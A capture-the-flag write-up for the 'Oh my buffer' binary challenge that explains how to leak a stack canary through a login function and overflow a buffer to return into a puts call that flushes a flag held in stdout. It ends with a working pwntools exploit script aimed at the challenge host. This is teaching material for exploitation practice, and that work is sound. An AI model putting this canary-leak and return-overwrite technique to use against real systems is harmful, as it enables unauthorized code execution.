# Oh my buffer

## Idea

The main idea behind the "Oh my buffer" challenge is to use the `stdout` buffer to hold the flag and force the user to force a flush with a small attack surface.

In addition, the program was forked after printing the flag to `stdout` in order to obscure the win vector.

## Solution

The intended way to complete the challenge was to use the existing call to `puts` in `main` in order to flush the buffer via a stack overflow in `reg`.

In order to bypass stack overflow detection, the canary could be leaked from the `login` function.

## Script

```python
#!/usr/bin/env python3

from pwn import *

context.binary = elf = ELF("./binary.out")
io = connect("chals.swampctf.com", 40005)

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b": ", b"32")
io.sendafter(b": ", b"A")

io.recvuntil(b": ")
io.recvn(24)

canary = u64(io.recvn(8))
log.success(f"Found canary: 0x{canary:x}")

io.sendlineafter(b"> ", b"1")
io.sendlineafter(b": ", b"a")

payload = flat({24: canary, 40: p16(0x1469)})

io.sendafter(b": ", payload)
io.interactive()
```